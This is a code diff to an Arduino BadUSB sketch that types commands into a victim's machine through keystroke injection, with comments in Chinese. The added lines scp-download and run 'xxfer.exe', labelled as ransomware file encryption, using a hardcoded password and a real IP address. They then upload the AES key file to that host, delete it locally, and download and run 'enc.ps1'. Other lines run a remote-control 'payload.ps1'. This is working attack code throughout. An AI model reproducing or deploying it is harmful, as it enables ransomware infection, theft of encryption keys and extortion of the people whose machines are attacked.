@@ -41,6 +41,42 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(10000);
+
+  //实现文件加密：勒索
+  Keyboard.println("scp badusb@118.178.229.36:/badusb/xxfer.exe ./");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(10000);
+  Keyboard.println("ljjyyds");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(30000);
+  Keyboard.println("./xxfer.exe");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(10000);
+  //上传密钥文件
+  Keyboard.println("scp ./aesssss.txt badusb@118.178.229.36:/badusb/uploads/");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
+  Keyboard.println("ljjyyds");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(5000);
+  Keyboard.println("del ./aesssss.txt");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
+  //默认打开方式脚本
+  Keyboard.println("invoke-webrequest -uri 'http://118.178.229.36:9888/uploads/enc.ps1' -outfile 'enc.ps1'");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
+  Keyboard.println("./enc.ps1");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
   
   //远程主控：将下载的payload.txt后缀改为ps1，并运行payload.ps1
   //下载文件
@@ -55,33 +91,6 @@ void setup() {
   delay(1000);
   //运行payload.ps1
   Keyboard.println("./payload.ps1");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3000);
-
-  //实现文件加密：勒索
-  Keyboard.println("scp badusb@118.178.229.36:/badusb/xxfer.exe ./");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(30000);
-  Keyboard.println("ljjyyds");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3000);
-  Keyboard.println("./xxfer.exe");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3000);
-  //上传密钥文件
-  Keyboard.println("scp .\aesssss.txt badusb@118.178.229.36:/badusb/uploads/");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3000);
-  Keyboard.println("ljjyyds");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3000);
-  Keyboard.println("del .\aesssss.txt");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(3000);
